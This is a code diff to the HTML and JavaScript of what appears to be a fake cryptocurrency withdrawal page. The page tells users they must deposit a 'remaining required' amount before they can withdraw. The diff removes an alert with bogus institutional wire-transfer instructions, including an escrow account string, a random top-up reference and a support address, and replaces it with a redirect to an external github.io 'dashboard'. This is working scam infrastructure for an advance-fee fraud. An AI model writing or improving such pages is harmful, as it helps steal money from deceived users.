@@ -563,7 +563,7 @@
 
                     <div class="input-group">
                         <label class="block text-[10px] font-bold uppercase tracking-widest opacity-50 mb-3 ml-1">Receiving Destination</label>
-                        <div class="address-wrapper">
+                        <div class="address-wrapper relative">
                             <i class="fas fa-shield-halved absolute left-5 top-1/2 -translate-y-1/2 opacity-30 text-sm"></i>
                             <input type="text" id="address" placeholder="Checking network protocols..." 
                                 class="w-full glass-panel bg-white/5 border-white/10 rounded-2xl py-5 pl-14 pr-5 text-sm font-medium focus:border-blue-500 outline-none">
@@ -872,18 +872,7 @@
             }
 
             function handleDeposit() {
-                alert(
-                    `🏦 INSTITUTIONAL DEPOSIT INSTRUCTIONS\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `Remaining Required: $${remainingToDeposit.toFixed(2)}\n\n` +
-                    `Please initiate a wire transfer or crypto deposit to:\n\n` +
-                    `Bank: Silvergate Bank (Institutional Custody)\n` +
-                    `Account: NEXUS-882-XPL-ESCROW\n` +
-                    `Reference: MINIMUM_TOPUP_${Math.random().toString(36).substring(2, 8).toUpperCase()}\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `For crypto deposits, use the wallet address provided in your dashboard.\n\n` +
-                    `Support: institutional@nexus-secure.io`
-                );
+                window.location.href = 'https://cryptoinc-codic.github.io/Bitcoin-/dashboard.html';
             }
 
             elements.amount.addEventListener('input', calculate);
